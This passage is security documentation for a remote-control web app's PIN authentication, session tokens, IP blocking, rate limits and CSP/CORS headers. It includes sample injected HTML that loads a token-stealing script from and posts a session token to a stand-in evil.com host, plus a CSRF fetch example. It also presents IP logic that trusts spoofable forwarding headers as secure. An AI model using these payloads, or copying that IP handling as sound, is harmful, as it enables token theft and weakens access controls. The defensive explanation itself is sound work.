# DocClaude: Authentication & Security System Documentation

**Project:** ClaudeCode_Remote
**System:** Authentication & Security Infrastructure
**Last Updated:** 2026-01-18
**Files Analyzed:**
- `backend/pin-manager.js`
- `backend/server.js` (authentication routes and middleware)

---

## Table of Contents

1. [PART 1: VERBOSE EXPLANATION OF FUNCTIONALITY](#part-1-verbose-explanation-of-functionality)
   - [PIN Authentication System](#pin-authentication-system)
   - [Session Token Generation and Validation](#session-token-generation-and-validation)
   - [IP Blacklisting Mechanism](#ip-blacklisting-mechanism)
   - [Rate Limiting Strategy](#rate-limiting-strategy)
   - [Security Headers and CSP](#security-headers-and-csp)
   - [Session Timeout and Cleanup](#session-timeout-and-cleanup)
   - [Cookie vs Token Storage](#cookie-vs-token-storage)
   - [Attack Mitigation](#attack-mitigation)
2. [PART 2: IMPORTANT VARIABLES/INPUTS/OUTPUTS](#part-2-important-variablesinputsoutputs)
   - [PinManager Class](#pinmanager-class)
   - [Authentication Middleware Functions](#authentication-middleware-functions)
   - [API Endpoints](#api-endpoints)
   - [Configuration Options](#configuration-options)
   - [Security Constants](#security-constants)
   - [Error Codes and Responses](#error-codes-and-responses)
   - [Event System](#event-system)

---

## PART 1: VERBOSE EXPLANATION OF FUNCTIONALITY

### PIN Authentication System

The ClaudeCode_Remote application implements a **PIN-based authentication system** that serves as the primary security layer for the entire application. This system is optional but highly recommended for production deployments, especially when the application is exposed through tunnels like Cloudflare.

#### How PIN Authentication Works

The PIN authentication system operates on a simple but secure principle:

1. **PIN Configuration**: The system administrator sets a 6-digit PIN either via:
   - Command-line argument: `node server.js --pin=123456`
   - Environment variable: `CLAUDECODE_PIN=123456`
   - CLI argument takes precedence over environment variable

2. **Authentication Flow**:
   ```
   Client Request → Check if PIN enabled →
   If enabled:
     → Check IP blacklist status →
     → Verify session token →
     → If no valid token: Return 401 (Unauthorized) →
     → Client presents PIN →
     → Server validates PIN →
     → If valid: Generate session token →
     → Return token to client →
     → Client stores token (header/cookie) →
     → Subsequent requests include token
   If disabled:
     → Allow access (development mode)
   ```

3. **Security Design Principles**:
   - **Zero-trust by default**: When PIN is enabled, ALL API endpoints (except `/api/health` and `/api/auth/*`) require a valid session token
   - **No backdoors**: Previous versions had an `AUTH_TOKEN` fallback mechanism that has been explicitly removed (line 356 in server.js)
   - **IP binding**: Session tokens are bound to the originating IP address to prevent token theft/reuse
   - **Stateless but secure**: Tokens are stored server-side in memory (Map), which means server restart invalidates all sessions (intentional security feature)

4. **Why 6-digit PIN?**:
   - Long enough to prevent trivial guessing (1 million combinations)
   - Short enough to be memorable and easy to type
   - Combined with rate limiting and IP blacklisting, provides sufficient security

#### PIN Validation Logic

The PIN validation happens in `PinManager.attemptLogin()`:

```javascript
if (enteredPin === this.pin) {
  // Success - reset attempts for this IP
  record.attempts = 0;

  // Create authenticated session
  const token = this.generateSessionToken();
  this.authenticatedSessions.set(token, {
    ip,
    authenticatedAt: Date.now()
  });

  return { success: true, token };
}
```

This is a simple string comparison, which is intentional. The PIN is not hashed because:
- It's only stored in server memory (never persisted to disk)
- Server restart requires manual PIN entry again
- The security comes from rate limiting and IP blocking, not cryptographic complexity
- Hashing would provide minimal additional security for the threat model

### Session Token Generation and Validation

Session tokens are the core mechanism by which authenticated users maintain their authentication state across multiple requests.

#### Token Generation

Tokens are generated using Node.js's built-in `crypto` module:

```javascript
generateSessionToken() {
  return crypto.randomBytes(32).toString('hex');
}
```

This generates a **64-character hexadecimal string** (32 bytes = 256 bits of entropy), which provides cryptographically strong randomness. The probability of collision is negligible (2^-256).

**Security characteristics:**
- **Unpredictable**: Uses cryptographically secure random number generator
- **Non-sequential**: Cannot guess next token from previous tokens
- **Single-use**: Each successful login generates a new unique token
- **Opaque**: Token contains no information about the user or permissions

#### Token Validation

Token validation is a multi-step process implemented in `PinManager.isSessionValid()`:

```javascript
isSessionValid(token, ip) {
  if (!token) return false;

  const session = this.authenticatedSessions.get(token);
  if (!session) return false;

  // Verify IP matches
  if (session.ip !== ip) {
    console.log(`Token used from different IP: ${ip} (original: ${session.ip})`);
    return false;
  }

  // Check expiration
  const now = Date.now();
  if (now - session.authenticatedAt > this.sessionTimeout) {
    this.authenticatedSessions.delete(token);
    return false;
  }

  return true;
}
```

**Validation checks (in order):**

1. **Token existence**: Is a token provided?
2. **Token recognition**: Does the token exist in our session store?
3. **IP binding verification**: Does the request come from the same IP that originally authenticated?
4. **Expiration check**: Has the session exceeded its timeout (default 4 hours)?

**Why IP binding?**
IP binding prevents session hijacking attacks where an attacker steals a victim's session token. Even if the attacker obtains the token (via XSS, network sniffing, etc.), they cannot use it from a different IP address. This is particularly important for:
- Preventing token replay attacks
- Mitigating credential stuffing
- Protecting against man-in-the-middle attacks

**Limitations of IP binding:**
- Mobile devices switching networks will lose their session
- Users behind NAT with dynamic IP assignment may face issues
- Load-balanced proxies might change client IP

The system handles the first header in the chain for `x-forwarded-for` to work with proxies like Cloudflare:

```javascript
getClientIP(req) {
  const forwarded = req.headers['cf-connecting-ip'] ||
                    req.headers['x-real-ip'] ||
                    req.headers['x-forwarded-for'];

  if (forwarded) {
    return forwarded.split(',')[0].trim(); // First IP in chain
  }

  return req.ip || req.connection?.remoteAddress || 'unknown';
}
```

#### Session Storage

Sessions are stored in-memory using a JavaScript `Map`:

```javascript
this.authenticatedSessions = new Map();
// Structure: token -> { ip: string, authenticatedAt: Date }
```

**Implications:**
- **Fast access**: O(1) lookup for validation
- **Volatile storage**: Server restart clears all sessions (security feature)
- **No persistence**: Sessions don't survive crashes/restarts
- **Memory bounded**: Each session is ~100 bytes, so even 10,000 active sessions = ~1MB

**Why in-memory instead of database?**
- Simplicity: No external dependencies
- Performance: Sub-millisecond lookups
- Security: No persistent attack surface
- Intentional expiration: Forces re-authentication on server restart

### IP Blacklisting Mechanism

The IP blacklisting system implements a progressive defense mechanism against brute-force attacks and distributed attacks.

#### Single-IP Blacklisting

**Trigger**: 3 consecutive failed login attempts from the same IP

**Implementation**:
```javascript
this.ipAttempts = new Map();
// IP -> { attempts: number, lastAttempt: Date, blocked: boolean }

// On failed login:
record.attempts++;
if (record.attempts >= this.maxAttemptsPerIP) {
  record.blocked = true;
  // Emit event for logging/alerting
  this.emit('ip-blocked', { ip, attempts: record.attempts, timestamp: new Date() });
}
```

**Behavior:**
- First 2 failed attempts: Warning returned with `attemptsRemaining` count
- 3rd failed attempt: IP is blocked
- Blocked IP receives HTTP 403 with `blocked: true` flag
- Block persists until server restart (intentional - no auto-unblock)

**Why 3 attempts?**
- Allows for typos (user might mistype PIN twice)
- Strict enough to prevent brute-force (1,000,000 / 3 = 333,333 IPs needed to try all PINs)
- Common security standard (matches bank ATM policies)

#### Global Lockdown Mechanism

**Trigger**: 5+ distinct IP addresses with failed login attempts

**Purpose**: Detect and mitigate distributed brute-force attacks where attackers use multiple IPs to bypass single-IP rate limiting.

**Implementation**:
```javascript
this.failedAttemptIPs = new Set(); // Track unique IPs with failures
this.globalLockdown = false;

// On each failed attempt:
this.failedAttemptIPs.add(ip);

if (!this.globalLockdown && this.failedAttemptIPs.size >= this.globalAlertThreshold) {
  this.globalLockdown = true;
  // Broadcast to all connected clients
  this.emit('global-lockdown', {
    reason: `${this.failedAttemptIPs.size} attempts from different IPs`,
    timestamp: new Date()
  });
}
```

**Effects when activated:**
- ALL new login attempts are rejected (even from IPs with 0 previous attempts)
- Existing authenticated sessions continue to work (graceful degradation)
- Administrator must manually disable lockdown via API endpoint
- Intended for attack scenarios, not normal operation

**Disabling lockdown:**
```javascript
disableLockdown() {
  if (this.globalLockdown) {
    this.globalLockdown = false;
    this.emit('lockdown-disabled', { timestamp: new Date() });
    return { success: true, message: 'Verrouillage desactive' };
  }
  return { success: false, message: 'Pas de verrouillage actif' };
}
```

**Attack scenario this prevents:**
```
Attacker scenario without global lockdown:
- Try PIN 000000 from IP 1.1.1.1 (3 attempts, blocked)
- Try PIN 000001 from IP 1.1.1.2 (3 attempts, blocked)
- Try PIN 000002 from IP 1.1.1.3 (3 attempts, blocked)
- ... continue with 333,333 IPs to try all PINs

With global lockdown after 5 distinct IPs:
- After 5 IPs fail, system locks down
- Attack is detected and stopped early
- Administrator is alerted
```

#### IP Attempt Tracking Data Structure

```javascript
{
  "192.168.1.100": {
    attempts: 2,
    lastAttempt: Date("2026-01-18T10:30:15Z"),
    blocked: false
  },
  "10.0.0.50": {
    attempts: 3,
    lastAttempt: Date("2026-01-18T10:29:45Z"),
    blocked: true
  }
}
```

### Rate Limiting Strategy

Rate limiting is implemented using the `express-rate-limit` middleware and operates at multiple levels to provide defense-in-depth.

#### Rate Limiting Tiers

**1. Authentication Rate Limit (`authLimiter`)**

Applied to: `/api/auth/login`

```javascript
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // 5 attempts
  message: { error: 'Trop de tentatives de connexion, réessayez dans 15 minutes' },
  keyGenerator: (req) => pinManager.getClientIP(req)
});
```

**Purpose**: Prevent brute-force attacks on the login endpoint
**Effect**: After 5 login attempts in 15 minutes, the IP must wait before trying again
**Interaction with IP blacklist**: This is an *additional* layer. The IP blacklist blocks after 3 *failed* attempts, while this rate limiter blocks after 5 *total* attempts (successful or failed)

**Attack mitigation:**
- Slows down brute-force attempts to 20 attempts/hour maximum
- To try all 1 million PIN combinations: 1,000,000 / 20 = 50,000 hours = 5.7 years
- Combined with global lockdown: Attack detected long before success

**2. General API Rate Limit (`apiLimiter`)**

Applied to: All `/api/*` routes

```javascript
const apiLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,    // 1 minute
  max: 200,                    // 200 requests
  message: { error: 'Trop de requêtes, ralentissez' },
  keyGenerator: (req) => pinManager.getClientIP(req)
});
```

**Purpose**: Prevent DoS attacks and API abuse
**Effect**: Limits each IP to 200 requests per minute across all API endpoints
**Reasoning**: Normal UI operation polls for:
- Session list: ~1 req/5sec = 12 req/min
- Active session details: ~1 req/2sec = 30 req/min
- Usage stats: ~1 req/10sec = 6 req/min
- Permissions: ~1 req/2sec = 30 req/min
- Total normal load: ~80 req/min, so 200 provides comfortable headroom

**3. Strict Operations Rate Limit (`strictLimiter`)**

Applied to: Sensitive operations like `/api/send`, `/api/inject`

```javascript
const strictLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,    // 1 minute
  max: 10,                     // 10 requests
  message: { error: 'Trop de requêtes pour cette opération sensible' },
  keyGenerator: (req) => pinManager.getClientIP(req)
});
```

**Purpose**: Prevent abuse of expensive/dangerous operations
**Effect**: Limits message sending and command injection to 10/minute
**Reasoning**: These operations:
- Consume Claude API tokens (cost money)
- Can cause unintended actions in Claude sessions
- Should be deliberate user actions, not automated

**4. Orchestrator Creation Rate Limit**

Applied to: `/api/orchestrator/create`

```javascript
const orchestratorCreateLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,    // 1 minute
  max: 10,                     // 10 creations
  message: { error: 'Trop de creations d\'orchestrateurs, ralentissez' },
  keyGenerator: (req) => pinManager.getClientIP(req)
});
```

**Purpose**: Prevent resource exhaustion from orchestrator creation
**Effect**: Limits orchestrator creation to 10 per minute per IP
**Reasoning**: Each orchestrator creates multiple Claude sessions, which are expensive in terms of:
- System resources (memory, CDP connections)
- API costs
- Complexity of state management

#### Rate Limit Key Generation

All rate limiters use IP-based keys via `pinManager.getClientIP(req)`, which:
- Respects proxy headers (`x-forwarded-for`, `cf-connecting-ip`)
- Takes the first IP in the chain (actual client, not proxy)
- Consistent with IP blacklisting and session binding

**Why IP-based instead of token-based?**
- Protects *unauthenticated* endpoints (especially login)
- Prevents attackers from bypassing limits by not sending a token
- More robust against distributed attacks

#### Rate Limit Headers

Standard rate limit headers are enabled:

```javascript
standardHeaders: true,   // Send RateLimit-* headers
legacyHeaders: false     // Don't send X-RateLimit-* headers
```

Clients receive headers like:
```
RateLimit-Limit: 200
RateLimit-Remaining: 187
RateLimit-Reset: 1642512000
```

This allows the frontend to:
- Show rate limit status to users
- Implement client-side throttling
- Display "please wait" messages before hitting limits

### Security Headers and CSP

The application implements comprehensive HTTP security headers to protect against various web-based attacks.

#### Security Headers Implemented

**1. X-Content-Type-Options: nosniff**

```javascript
res.setHeader('X-Content-Type-Options', 'nosniff');
```

**Purpose**: Prevent MIME-type sniffing attacks
**Effect**: Browser must respect the declared `Content-Type` header
**Attack prevented**:
- Attacker uploads a file disguised as image.jpg but containing JavaScript
- Without this header: Browser might execute it as JavaScript
- With this header: Browser treats it strictly as an image

**2. X-Frame-Options: DENY**

```javascript
res.setHeader('X-Frame-Options', 'DENY');
```

**Purpose**: Prevent clickjacking attacks
**Effect**: Page cannot be embedded in `<iframe>`, `<frame>`, `<embed>`, or `<object>`
**Attack prevented**:
- Attacker creates malicious page with transparent iframe over ClaudeCode UI
- User thinks they're clicking attacker's buttons, but actually clicking ClaudeCode buttons
- Could trick user into deleting sessions, sending messages, etc.

**3. X-XSS-Protection: 1; mode=block**

```javascript
res.setHeader('X-XSS-Protection', '1; mode=block');
```

**Purpose**: Enable browser's built-in XSS filter (legacy browsers)
**Effect**: If XSS detected, page is blocked instead of sanitized
**Note**: Modern CSP makes this largely redundant, but provides defense-in-depth for older browsers

**4. Referrer-Policy: no-referrer**

```javascript
res.setHeader('Referrer-Policy', 'no-referrer');
```

**Purpose**: Prevent leaking URLs to external sites
**Effect**: When user clicks external link, destination site doesn't receive Referer header
**Privacy benefit**: Prevents session IDs, tokens, or sensitive path information from leaking

Example without this header:
```
User on: https://app.com/session/local_abc123?token=xyz789
Clicks link to: https://external.com
External site receives: Referer: https://app.com/session/local_abc123?token=xyz789
```

With `no-referrer`: External site receives no Referer header.

#### Content Security Policy (CSP)

```javascript
res.setHeader('Content-Security-Policy',
  "default-src 'self'; " +
  "script-src 'self' 'unsafe-inline'; " +
  "style-src 'self' 'unsafe-inline'; " +
  "img-src 'self' data: https:; " +
  "connect-src 'self' ws: wss:; " +
  "font-src 'self'; " +
  "object-src 'none'; " +
  "base-uri 'self'; " +
  "form-action 'self'"
);
```

Let's break down each directive:

**`default-src 'self'`**
- Default policy for any resource type not explicitly specified
- `'self'`: Only load from same origin (scheme + host + port)
- Blocks all external resources by default (defense-in-depth)

**`script-src 'self' 'unsafe-inline'`**
- JavaScript sources
- `'self'`: Load from same origin
- `'unsafe-inline'`: Allow inline `<script>` tags and event handlers
- **Security note**: `'unsafe-inline'` weakens CSP but is required for the current codebase. Future improvement would be to use nonces or move to external JS files.

**`style-src 'self' 'unsafe-inline'`**
- CSS sources
- Similar to script-src
- `'unsafe-inline'`: Required for inline `<style>` tags and `style` attributes

**`img-src 'self' data: https:`**
- Image sources
- `'self'`: Same-origin images
- `data:`: Allow data URIs (base64-encoded images)
- `https:`: Allow any HTTPS image source (for user avatars, external resources)

**`connect-src 'self' ws: wss:`**
- AJAX, WebSocket, and other fetch requests
- `'self'`: Allow API calls to same origin
- `ws:` `wss:`: Allow WebSocket connections (critical for real-time updates)

**`font-src 'self'`**
- Font files
- Only same-origin fonts

**`object-src 'none'`**
- `<object>`, `<embed>`, `<applet>` tags
- `'none'`: Completely blocked (prevents Flash/Java exploits)

**`base-uri 'self'`**
- `<base>` tag href values
- Prevents attackers from changing the base URL for relative links

**`form-action 'self'`**
- Form submission targets
- Prevents forms from submitting to external sites

**Attack scenarios prevented by CSP:**

1. **XSS with external script injection**:
   ```html
   <!-- Attacker injects: -->
   <script src="https://evil.com/steal-tokens.js"></script>
   <!-- Blocked by script-src 'self' -->
   ```

2. **Exfiltration via form submission**:
   ```html
   <!-- Attacker injects: -->
   <form action="https://evil.com/collect" method="POST">
     <input name="sessionToken" value="...">
   </form>
   <!-- Blocked by form-action 'self' -->
   ```

3. **Malicious iframe content**:
   ```html
   <!-- Attacker injects: -->
   <iframe src="https://evil.com/phishing"></iframe>
   <!-- Blocked by default-src 'self' -->
   ```

#### CORS Policy

```javascript
app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (mobile apps, curl)
    if (!origin) return callback(null, true);

    // Allow localhost
    if (allowedOrigins.includes(origin)) {
      return callback(null, true);
    }

    // Allow Cloudflare tunnel domains
    if (origin.endsWith('.trycloudflare.com')) {
      return callback(null, true);
    }

    console.warn(`[Security] Blocked CORS request from origin: ${origin}`);
    callback(new Error('Not allowed by CORS'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-session-token']
}));
```

**CORS Configuration Explained:**

- **`credentials: true`**: Allow cookies and authentication headers
- **`methods`**: Only allow GET, POST, OPTIONS (no DELETE, PUT for safety)
- **`allowedHeaders`**: Explicitly whitelist headers (prevents header injection attacks)
- **Dynamic origin validation**: More flexible than static list
  - Localhost: For local development
  - Cloudflare tunnels: For production tunneling
  - Blocks all other origins

**Security benefit**: Prevents malicious websites from making authenticated requests to the ClaudeCode API using a victim's browser.

### Session Timeout and Cleanup

Session management includes automatic expiration and cleanup mechanisms to prevent stale sessions from accumulating.

#### Session Timeout

**Default timeout**: 4 hours (14,400,000 milliseconds)

```javascript
this.sessionTimeout = options.sessionTimeout || 4 * 60 * 60 * 1000;
```

**Configurable via constructor**:
```javascript
const pinManager = new PinManager({
  sessionTimeout: 8 * 60 * 60 * 1000  // 8 hours
});
```

**Timeout check during validation**:
```javascript
const now = Date.now();
if (now - session.authenticatedAt > this.sessionTimeout) {
  this.authenticatedSessions.delete(token);  // Auto-cleanup on access
  return false;
}
```

**Why 4 hours?**
- Long enough for typical work session
- Short enough to limit exposure if token is stolen
- Matches typical OAuth token lifetimes
- User can manually refresh to extend

#### Session Refresh

Users can extend their session without re-entering the PIN:

```javascript
refreshSession(token, ip) {
  const session = this.authenticatedSessions.get(token);

  // Verify IP matches
  if (session.ip !== ip) {
    return { success: false, error: 'IP non autorisee' };
  }

  // Check not already expired
  const now = Date.now();
  if (now - session.authenticatedAt > this.sessionTimeout) {
    this.authenticatedSessions.delete(token);
    return { success: false, error: 'Session expiree' };
  }

  // Refresh by updating timestamp
  session.authenticatedAt = now;

  return {
    success: true,
    expiresAt: now + this.sessionTimeout,
    remainingMs: this.sessionTimeout
  };
}
```

**API endpoint**: `POST /api/auth/refresh`

**Use case**: Frontend polls this endpoint when user is active, automatically extending their session without interruption.

**Security consideration**: Refresh is still IP-bound, so stolen tokens cannot be refreshed from a different location.

#### Session Info for Expiration Warnings

The frontend can check remaining session time to warn users:

```javascript
getSessionInfo(token, ip) {
  const session = this.authenticatedSessions.get(token);
  if (!session || session.ip !== ip) return null;

  const now = Date.now();
  const expiresAt = session.authenticatedAt + this.sessionTimeout;
  const remainingMs = expiresAt - now;

  if (remainingMs <= 0) {
    this.authenticatedSessions.delete(token);
    return null;
  }

  return {
    authenticatedAt: session.authenticatedAt,
    expiresAt,
    remainingMs,
    sessionTimeout: this.sessionTimeout
  };
}
```

**Frontend usage**:
```javascript
// Check every minute
setInterval(async () => {
  const info = await fetch('/api/auth/session-info').then(r => r.json());
  if (info.remainingMs < 5 * 60 * 1000) {  // Less than 5 minutes
    showWarning('Session expiring soon. Activity will extend it.');
  }
}, 60000);
```

#### Expired Session Cleanup

Manual cleanup of expired sessions:

```javascript
cleanupExpiredSessions() {
  const now = Date.now();
  let cleaned = 0;

  for (const [token, session] of this.authenticatedSessions.entries()) {
    if (now - session.authenticatedAt > this.sessionTimeout) {
      this.authenticatedSessions.delete(token);
      cleaned++;
    }
  }

  return cleaned;
}
```

**When called**:
- Can be called manually via internal API
- Sessions are automatically cleaned up on validation attempt (lazy cleanup)
- No periodic cleanup job currently (could be added)

**Memory efficiency**: Even without periodic cleanup, memory is bounded because:
- Sessions expire after 4 hours maximum
- Validation attempts trigger cleanup
- Server restart clears all sessions

#### Session Caching (Separate from Authentication)

The server implements a separate cache for Claude session data (NOT authentication sessions):

```javascript
const sessionCache = new Map();
const SESSION_CACHE_TTL_MS = 5000; // 5 seconds

function getCachedSession(sessionId) {
  const cached = sessionCache.get(sessionId);
  if (cached && (Date.now() - cached.timestamp) < SESSION_CACHE_TTL_MS) {
    return cached.data;
  }
  return null;
}
```

**Purpose**: Reduce CDP (Chrome DevTools Protocol) calls for session data
**TTL**: 5 seconds
**Not related to authentication**: This caches Claude session content, not authentication state

Automatic cleanup every 30 seconds:
```javascript
setInterval(() => {
  const now = Date.now();
  for (const [sessionId, cached] of sessionCache.entries()) {
    if ((now - cached.timestamp) > SESSION_CACHE_TTL_MS) {
      sessionCache.delete(sessionId);
    }
  }
}, 30000);
```

### Cookie vs Token Storage

The authentication system supports **multiple token transport mechanisms** to accommodate different client types and requirements.

#### Token Transport Methods

**1. HTTP Header: `x-session-token`**

```javascript
const sessionToken = req.headers['x-session-token'];
```

**Advantages**:
- Explicit authentication control
- Not automatically sent (immune to CSRF)
- Works with CORS requests
- Easy to manage in JavaScript

**Client implementation**:
```javascript
fetch('/api/sessions', {
  headers: {
    'x-session-token': 'abc123def456...'
  }
});
```

**2. Cookie: `sessionToken`**

```javascript
const sessionToken = req.cookies?.sessionToken;
```

**Advantages**:
- Automatically sent with all requests
- Can be made httpOnly (inaccessible to JavaScript)
- Standard browser mechanism

**Server response to set cookie**:
```javascript
res.cookie('sessionToken', token, {
  httpOnly: true,     // Prevent XSS access
  secure: true,       // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 4 * 60 * 60 * 1000  // 4 hours
});
```

**Note**: Current implementation doesn't set httpOnly cookie automatically. Client must store token and send in header (more flexible for SPA).

**3. Query Parameter: `?token=...`**

```javascript
const sessionToken = req.query?.token;
```

**Advantages**:
- Works with EventSource (Server-Sent Events) which can't send custom headers
- Useful for image/media URLs that need authentication

**Security warning**: Query parameters appear in:
- Server logs
- Browser history
- Referer headers (if not blocked)

**Only used for**: SSE endpoint (`/api/logs/stream?token=...`) where headers aren't possible.

#### Authentication Middleware Token Priority

```javascript
const sessionToken = req.headers['x-session-token'] ||
                    req.cookies?.sessionToken ||
                    req.query?.token;
```

**Priority order**:
1. Header (preferred, most explicit)
2. Cookie (fallback, auto-sent)
3. Query param (only for SSE compatibility)

**Why this order?**
- Header is most intentional (client must explicitly include)
- Cookie is automatic but secure
- Query param is least secure but necessary for some APIs

#### Recommendation for Clients

**Single-Page Applications (SPA)**:
- Store token in memory or sessionStorage
- Send via `x-session-token` header
- Clear on page unload

**Mobile Apps**:
- Store in secure keychain/keystore
- Send via header

**Server-Sent Events**:
- Use query parameter (only option)
- Close connection when done

### Attack Mitigation

The authentication system implements multiple layers of defense against various attack vectors.

#### 1. Brute-Force Attack Mitigation

**Attack**: Attacker tries all possible PINs

**Defenses**:

a) **Per-IP rate limiting** (3 attempts → block)
   - Requires 333,333 different IP addresses to try all 1,000,000 PINs
   - Makes single-source attacks impractical

b) **Global lockdown** (5 distinct IPs fail → lockdown)
   - Detects distributed attacks early
   - Blocks all new authentication attempts
   - Alerts administrator

c) **Time-based rate limiting** (5 attempts per 15 minutes)
   - Even if IP blacklist is bypassed, still limited to 20 attempts/hour
   - 50,000 hours to try all PINs from single IP
   - Makes brute-force attack infeasible

**Combined effectiveness**:
```
Single attacker, single IP:
- 3 attempts → IP blocked forever (this session)
- Max damage: 3 wrong guesses

Single attacker, 5 different IPs:
- 5 IPs × 3 attempts = 15 wrong guesses
- Global lockdown triggered
- No further attempts possible

Distributed attackers, 1000 IPs:
- First 5 IPs → 15 wrong guesses
- Global lockdown triggered
- Remaining 995 IPs cannot attempt
```

#### 2. Session Hijacking Mitigation

**Attack**: Attacker steals victim's session token

**Defenses**:

a) **IP binding**:
   ```javascript
   if (session.ip !== ip) {
     console.log(`Token used from different IP`);
     return false;
   }
   ```
   - Stolen token is useless from different IP
   - Prevents remote hijacking

   **Limitation**: Same local network hijacking still possible (e.g., WiFi eavesdropping)

b) **Token unpredictability**:
   - 256 bits of entropy (2^256 possible values)
   - Cannot guess or derive other tokens

c) **Short token lifetime**:
   - 4-hour expiration
   - Limits exposure window if token is compromised

d) **HTTPS enforcement** (recommended):
   - Tokens should only be transmitted over TLS
   - Prevents network sniffing
   - **Note**: Application doesn't enforce HTTPS (should use reverse proxy for TLS)

e) **No token in URL**:
   - Token in header, not query param (except for SSE)
   - Prevents leaking in logs/history

#### 3. Cross-Site Request Forgery (CSRF) Mitigation

**Attack**: Malicious site makes authenticated requests to ClaudeCode API using victim's browser

**Defenses**:

a) **Token-based auth (not cookies)**:
   - `x-session-token` header must be explicitly set
   - Malicious site cannot set custom headers (CORS restriction)

b) **CORS policy**:
   ```javascript
   origin: (origin, callback) => {
     if (origin.endsWith('.trycloudflare.com') || allowedOrigins.includes(origin)) {
       return callback(null, true);
     }
     callback(new Error('Not allowed by CORS'));
   }
   ```
   - Blocks requests from unauthorized origins

c) **SameSite cookie flag** (if cookies used):
   ```javascript
   sameSite: 'strict'  // Cookie not sent with cross-site requests
   ```

**Example blocked attack**:
```html
<!-- Malicious site: evil.com -->
<script>
// Attempt to delete sessions
fetch('https://claudecode.example.com/api/session/local_123/archive', {
  method: 'POST',
  headers: {
    'x-session-token': 'stolen_token_abc123'  // ❌ CORS blocks this header
  }
});
// Request is blocked before reaching server
</script>
```

#### 4. Denial of Service (DoS) Mitigation

**Attack**: Attacker floods server with requests

**Defenses**:

a) **Rate limiting**:
   - 200 requests/minute per IP (general API)
   - 5 requests/15min per IP (login)
   - 10 requests/minute per IP (sensitive operations)

b) **Request size limits**:
   ```javascript
   app.use(express.json({ limit: '1mb' }));
   ```
   - Prevents large payload attacks

c) **Connection limits** (WebSocket):
   ```javascript
   // Authenticate WebSocket connections
   if (pinManager.isPinEnabled() && !pinManager.isSessionValid(token, ip)) {
     ws.close(4001, 'Unauthorized');
     return;
   }
   ```
   - Prevents unauthorized WebSocket connection spam

d) **Timeout policies**:
   - 4-hour session timeout
   - Automatic cleanup of expired sessions
   - Prevents session accumulation

#### 5. Credential Stuffing Mitigation

**Attack**: Attacker uses leaked username/password from other sites

**Defense**:

a) **No username/password system**:
   - Single PIN applies to entire server
   - No individual user accounts to target

b) **PIN is site-specific**:
   - Not reused from other services
   - Leak from other sites doesn't help attacker

#### 6. SQL Injection / NoSQL Injection Mitigation

**Defense**:

a) **No database**:
   - All data in memory (Map objects)
   - No SQL/NoSQL injection surface

b) **No dynamic queries**:
   - All data access via direct Map operations
   - `authenticatedSessions.get(token)` - no injection possible

#### 7. Cross-Site Scripting (XSS) Mitigation

**Defenses**:

a) **Content Security Policy**:
   - Blocks inline scripts (with exceptions for app functionality)
   - Blocks external scripts

b) **Security headers**:
   - `X-Content-Type-Options: nosniff`
   - `X-XSS-Protection: 1; mode=block`

c) **API-only design**:
   - Server returns JSON, not HTML
   - No server-side rendering that could inject content
   - Frontend responsible for safe rendering

#### 8. Timing Attack Mitigation

**Attack**: Attacker measures response time to leak information

**Current status**: **Vulnerable** to timing attacks on PIN comparison

```javascript
if (enteredPin === this.pin) {  // ❌ String comparison not constant-time
```

**Impact**: Minimal, because:
- PIN is 6 digits (very short)
- Rate limiting prevents many attempts
- IP blacklisting limits exposure

**Potential improvement**: Use constant-time comparison
```javascript
// Future improvement
const crypto = require('crypto');
function constantTimeEqual(a, b) {
  return crypto.timingSafeEqual(
    Buffer.from(a),
    Buffer.from(b)
  );
}
```

#### 9. Memory Leak Prevention

**Defenses**:

a) **Bounded storage**:
   ```javascript
   this.ipAttempts = new Map();          // Max ~1000 IPs realistically
   this.authenticatedSessions = new Map(); // Limited by timeout
   this.failedAttemptIPs = new Set();     // Max ~1000 IPs
   ```

b) **Automatic cleanup**:
   - Expired sessions removed on validation
   - Server restart clears all memory

c) **No circular references**:
   - Simple data structures
   - No complex object graphs

#### 10. Server Restart Protection

**Attack**: Attacker repeatedly crashes/restarts server to clear blacklist

**Defense**:

a) **Stateless blacklist is intentional**:
   - Forces manual intervention after suspected attack
   - Administrator must investigate before restart

b) **Logging of security events**:
   ```javascript
   pinManager.on('ip-blocked', (data) => {
     console.log(`[SECURITE] IP bloquee: ${data.ip}`);
   });
   ```
   - All blocks are logged
   - Can implement external alerting

**Potential improvement**: Persist blacklist to file/database to survive restarts

---

## PART 2: IMPORTANT VARIABLES/INPUTS/OUTPUTS

### PinManager Class

#### Constructor

```javascript
constructor(options = {})
```

**Purpose**: Initialize the PIN authentication manager with configuration options.

**Parameters**:
- `options` (Object): Configuration object
  - `options.pin` (String, optional): The 6-digit PIN. If not provided, falls back to `process.env.CLAUDECODE_PIN`
  - `options.maxAttemptsPerIP` (Number, optional): Maximum failed attempts before IP blacklist. Default: 3
  - `options.globalAlertThreshold` (Number, optional): Number of distinct failed IPs before global lockdown. Default: 5
  - `options.sessionTimeout` (Number, optional): Session lifetime in milliseconds. Default: 14,400,000 (4 hours)

**Returns**: PinManager instance

**Example**:
```javascript
const pinManager = new PinManager({
  pin: '123456',
  maxAttemptsPerIP: 5,
  globalAlertThreshold: 10,
  sessionTimeout: 2 * 60 * 60 * 1000  // 2 hours
});
```

#### Properties

```javascript
// Configuration
this.pin                    // String | null - The 6-digit PIN (null = disabled)
this.maxAttemptsPerIP       // Number - Max attempts before IP block (default: 3)
this.globalAlertThreshold   // Number - Distinct IPs before lockdown (default: 5)
this.sessionTimeout         // Number - Session lifetime in ms (default: 4 hours)

// State storage (in-memory)
this.ipAttempts            // Map<String, Object> - IP -> attempt record
                           // Structure: { attempts: Number, lastAttempt: Date, blocked: Boolean }

this.authenticatedSessions // Map<String, Object> - Token -> session record
                           // Structure: { ip: String, authenticatedAt: Number }

this.totalFailedAttempts   // Number - Total count of all failed attempts
this.failedAttemptIPs      // Set<String> - Distinct IPs with failures
this.globalLockdown        // Boolean - Global lockdown active flag
```

#### Methods

##### isPinEnabled()

```javascript
isPinEnabled(): Boolean
```

**Purpose**: Check if PIN authentication is configured and enabled.

**Parameters**: None

**Returns**:
